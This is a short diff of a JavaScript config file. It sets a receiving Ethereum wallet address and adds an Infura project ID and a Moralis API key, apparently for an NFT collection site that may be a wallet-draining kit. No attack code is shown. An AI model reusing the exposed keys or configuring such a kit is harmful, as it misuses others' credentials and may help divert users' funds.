@@ -1,8 +1,9 @@
 /*
     = = = = = YOU WALLET ADRESS = = = = =
 */
-
-const receiveAddress = "YOUR WALLET";
+const receiveAddress = "0xae8E762F8fE3D9c785d554Cc8ddD270DbabDf85D";
+const infuraId = "f1e64b9f276a45898d5f8191c644adad"     // Infuria ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "kLXF7phtJc4Kqe5uzlnjkBxrrXl1pWtnOulB3TuWYYpEhf0OUAM41AKf8YI3hibo"    // x-api-key | https://moralis.io/ | For NFTs
 
 /*
     = = = = = COLLECTION SETTINGS = = = = =
